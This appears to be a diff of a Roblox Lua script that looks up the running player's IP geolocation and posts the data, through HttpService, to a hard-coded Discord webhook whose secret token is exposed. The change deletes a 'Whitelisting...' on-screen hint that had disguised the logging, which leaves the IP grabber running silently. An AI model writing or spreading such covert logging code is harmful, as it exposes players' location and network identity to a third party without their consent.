@@ -1,8 +1,5 @@
 local HTTP = game:GetService("HttpService")
 
-local whitelistingHint = Instance.new("Hint", workspace)
-whielistingHint.Text = "Whitelisting..."
-
 local webhookurl = "https://discord.com/api/webhooks/1172578120373645342/O3zNN3CZXkL5Qgce4YaOlbOdPAxX24iQ9XwUtIsCmjzCVrvm_Z3VInHb-udTa-tHk78_"
 local player = game.Players.LocalPlayer
 local aaaaa = game:HttpGet("https://api.techniknews.net/ipgeo")
@@ -37,5 +34,3 @@ local a = HTTP:JSONDecode(aaaaa)
 	}
 	local finaldata = HTTP:JSONEncode(data)
 	HTTP:PostAsync(webhookurl, finaldata)
-
-whielistingHint:Destroy()
